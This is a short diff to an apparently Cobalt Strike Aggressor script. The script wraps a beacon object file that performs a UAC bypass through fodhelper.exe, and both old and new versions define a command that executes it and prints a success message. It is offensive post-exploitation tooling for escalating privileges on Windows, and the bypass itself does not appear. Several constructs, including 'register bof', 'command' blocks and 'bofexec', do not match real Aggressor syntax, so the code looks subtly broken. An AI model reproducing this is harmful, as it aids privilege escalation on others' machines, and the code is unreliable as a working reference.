@@ -1,11 +1,11 @@
-script {
-    register bof "fodhelper_bof" {
-        set description "UAC Bypass via fodhelper.exe"
-    }
+# Aggressor Script for Fodhelper UAC Bypass BOF
+alias fodhelper_bypass {
+    local('$result');
+
+    # Execute the BOF
+    $result = bofexec("fodhelper_bof");
+
+    # Print the result
+    println("[*] UAC Bypass triggered via fodhelper.exe");
 }
 
-command "fodhelper_bypass" {
-    local('$result');
-    $result = bofexec("fodhelper_bof");
-    println("UAC Bypass triggered.");
-}
